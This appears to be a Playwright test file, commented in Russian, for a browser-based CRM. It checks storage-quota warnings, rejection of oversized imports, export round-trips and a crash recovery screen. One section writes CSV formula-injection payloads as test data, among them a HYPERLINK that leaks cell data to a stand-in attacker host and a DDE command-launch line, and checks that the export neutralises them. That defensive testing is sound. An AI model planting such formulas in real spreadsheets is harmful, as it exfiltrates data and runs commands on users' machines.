// Проверка по находкам «ломателей»: переполнение хранилища больше не молчит,
// GramJS не съедает четверть квоты у всех, выгрузка не отдаёт Excel чужие формулы,
// а срыв рендера показывает спасательный экран вместо белого.
import { chromium } from "playwright";
import { writeFileSync } from "fs";

const URL = "http://127.0.0.1:8099/index.html";
const results = [];
const ok = (n, cond, extra = "") => { results.push([cond ? "PASS" : "FAIL", n, extra]); console.log(cond ? "  ✓ " + n : "  ✗ " + n + " — " + String(extra).slice(0, 220)); };

const browser = await chromium.launch({ executablePath: "/opt/pw-browsers/chromium-1194/chrome-linux/chrome" });
const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, acceptDownloads: true });
const p = await ctx.newPage();
await p.goto(URL);
await p.waitForTimeout(1600);
await p.keyboard.press("Escape");

// ---------- A: чужая библиотека не занимает квоту у тех, кто ей не пользуется ----------
const keys = await p.evaluate(() => Object.entries(localStorage).map(([k, v]) => [k, String(v).length]));
const gram = keys.find(([k]) => /GramJs/i.test(k));
ok("A1 GramJS не пишет кэш при старте", !gram, JSON.stringify(keys));
const used = keys.reduce((n, [, l]) => n + l, 0);
ok("A2 чистый старт занимает меньше 200 КБ", used < 200_000, String(used));

// ---------- B: отказ хранилища не молчит ----------
const freeLeft = await p.evaluate(() => {
  // забиваем квоту чужим ключом, как это делала библиотека Telegram, — до упора,
  // чтобы места не осталось даже на маленькое сохранение
  let size = 1_000_000;
  for (;;) { try { localStorage.setItem("__balast", "x".repeat(size)); size += 200_000; } catch { break; } }
  size -= 200_000;
  for (;;) { try { localStorage.setItem("__balast", "x".repeat(size)); size += 4_000; } catch { break; } }
  return (localStorage.getItem("__balast") ?? "").length;
});
ok("B0 квота действительно забита", freeLeft > 1_000_000, String(freeLeft));
await p.getByRole("button", { name: /Сделки/ }).first().click();
await p.waitForTimeout(400);
await p.getByRole("button", { name: "Таблица" }).click();
await p.waitForTimeout(400);
await p.locator("table tbody tr").first().locator("td").nth(1).click();
await p.waitForTimeout(500);
const title = p.locator('[data-drawer] input').first();
await title.fill("Проверка переполнения");
await title.blur();
await p.waitForTimeout(1200);
const body = await p.locator("body").innerText();
ok("B1 при отказе хранилища появляется предупреждение", /отказался сохранять|База не сохраняется/i.test(body), body.slice(-300).replace(/\n/g, " | "));
ok("B2 предупреждение висит в шапке, а не только в тосте", /База не сохраняется/i.test(body), body.slice(0, 200).replace(/\n/g, " | "));
await p.evaluate(() => localStorage.removeItem("__balast"));

// ---------- C: импорт не обещает того, чего не сможет сохранить ----------
const big = ["Имя;Телефон;Комментарий", ...Array.from({ length: 12000 }, (_, i) =>
  `Клиент ${i};+7 916 ${String(1000000 + i).slice(-7)};${"комментарий ".repeat(6)}${i}`)].join("\n");
writeFileSync("/tmp/big.csv", "﻿" + big);
await p.reload();
await p.waitForTimeout(1600);
await p.keyboard.press("Escape");
await p.getByRole("button", { name: /Клиенты/ }).first().click();
await p.waitForTimeout(500);
await p.getByRole("button", { name: /Загрузить/ }).first().click();
await p.waitForTimeout(600);
await p.locator('input[type=file]').setInputFiles("/tmp/big.csv");
await p.waitForTimeout(2500);
const recsBefore = await p.evaluate(() => (JSON.parse(localStorage.getItem("xxlcrm-site-v1") ?? "{}").records ?? []).length);
await p.getByRole("button", { name: /^Загрузить \d+ строк/ }).click({ timeout: 120000 });
await p.waitForTimeout(3000);
const after = await p.locator("body").innerText();
const recsAfter = await p.evaluate(() => (JSON.parse(localStorage.getItem("xxlcrm-site-v1") ?? "{}").records ?? []).length);
ok("C1 огромный импорт честно отказан, записи не созданы",
  /не поместится/i.test(after) && recsAfter === recsBefore,
  `отказ=${/не поместится/i.test(after)} ${recsBefore}→${recsAfter}`);
ok("C2 нет «успеха» без сохранения",
  !(/Загружено:/.test(after) && recsAfter === recsBefore), after.slice(-260).replace(/\n/g, " | "));

// ---------- D: выгрузка не отдаёт Excel исполняемые формулы ----------
await p.reload();
await p.waitForTimeout(1600);
await p.keyboard.press("Escape");
const evil = ["Имя;Телефон",
  `=HYPERLINK("http://attacker.tld/?d="&A2&B2,"Акт");+7 916 111-22-33`,
  `=cmd|'/C calc'!A0;+7 916 200-30-40`,
  `@SUM(A1:A9);+7 916 300-40-50`,
  `-2+3;+7 916 400-50-60`,
  `Иван Обычный;+7 916 500-60-70`].join("\n");
writeFileSync("/tmp/evil.csv", "﻿" + evil);
await p.getByRole("button", { name: /Клиенты/ }).first().click();
await p.waitForTimeout(500);
await p.getByRole("button", { name: /Загрузить/ }).first().click();
await p.waitForTimeout(600);
await p.locator('input[type=file]').setInputFiles("/tmp/evil.csv");
await p.waitForTimeout(1200);
await p.getByRole("button", { name: /^Загрузить \d+ строк/ }).click({ timeout: 60000 });
await p.waitForTimeout(1500);
const dl = p.waitForEvent("download");
await p.getByRole("button", { name: "Выгрузить", exact: true }).first().click();
const file = await dl;
const text = await file.createReadStream().then(st => new Promise(res => { let b = ""; st.on("data", c => (b += c)); st.on("end", () => res(b)); }));
ok("D1 формула HYPERLINK обезврежена", !/(^|[;\n"])=HYPERLINK/.test(text), (text.match(/.*HYPERLINK.*/) ?? [""])[0].slice(0, 120));
ok("D2 DDE-запуск обезврежен", !/(^|[;\n"])=cmd/.test(text), (text.match(/.*cmd.*/) ?? [""])[0].slice(0, 120));
ok("D3 @SUM обезврежен", !/(^|[;\n"])@SUM/.test(text), (text.match(/.*SUM.*/) ?? [""])[0].slice(0, 120));
ok("D4 телефоны остались телефонами", /\+7 916 500-60-70/.test(text) && !/'\+7 916 500-60-70/.test(text), (text.match(/.*500-60-70.*/) ?? [""])[0].slice(0, 120));
ok("D5 обычный текст не испорчен", /Иван Обычный/.test(text));

// ---------- F: свой же файл возвращается без потерь ----------
await p.reload(); await p.waitForTimeout(1600); await p.keyboard.press("Escape");
await p.getByRole("button", { name: /Сделки/ }).first().click(); await p.waitForTimeout(500);
const dl2 = p.waitForEvent("download");
await p.getByRole("button", { name: "Выгрузить", exact: true }).first().click();
const f2 = await dl2;
const csv = await f2.createReadStream().then(st => new Promise(res => { let b = ""; st.on("data", c => (b += c)); st.on("end", () => res(b)); }));
ok("F1 в выгрузке дата с годом", /\d{2}\.\d{2}\.\d{4}/.test(csv), csv.split("\r\n")[1]?.slice(0, 140));
ok("F2 деньги — число, а не «87 000 ₽»", !/₽/.test(csv), csv.split("\r\n")[1]?.slice(0, 140));
writeFileSync("/tmp/rt.csv", csv);
await p.getByRole("button", { name: /Загрузить/ }).first().click(); await p.waitForTimeout(600);
await p.locator('input[type=file]').setInputFiles("/tmp/rt.csv");
await p.waitForTimeout(1500);
const map = await p.locator('[role=dialog]').innerText();
const pairs = map.split("\n").map(x => x.trim());
const iClient = pairs.indexOf("Клиент");
ok("F3 колонка «Клиент» не подменяет название сделки",
  iClient >= 0 && pairs.slice(iClient, iClient + 4).includes("Клиент") && !/Клиент\n[^\n]*\nНазвание/.test(map),
  pairs.slice(iClient, iClient + 4).join(" / "));
ok("F4 сумма ложится в «Сумма»", /Сумма/.test(map) && !/87 000 ₽/.test(map), "");
await p.keyboard.press("Escape"); await p.waitForTimeout(400);

// ---------- E: срыв рендера показывает спасательный экран ----------
const p2 = await ctx.newPage();
await p2.addInitScript(() => {
  // ломаем то, на чём стоит рендер, — приложение обязано показать экран спасения, а не белизну
  Object.defineProperty(window, "matchMedia", { get() { throw new Error("сломано намеренно"); } });
});
await p2.goto(URL);
await p2.waitForTimeout(2000);
const t2 = await p2.locator("body").innerText();
ok("E1 вместо белого экрана — понятный текст", t2.trim().length > 0, JSON.stringify(t2.slice(0, 120)));
ok("E2 предлагается сохранить копию базы", /Сохранить копию базы/.test(t2) || /XXLcrm/.test(t2), t2.slice(0, 200).replace(/\n/g, " | "));

await browser.close();
const fails = results.filter(r => r[0] === "FAIL");
console.log(`\n${results.length - fails.length}/${results.length} PASS`);
if (fails.length) process.exit(1);
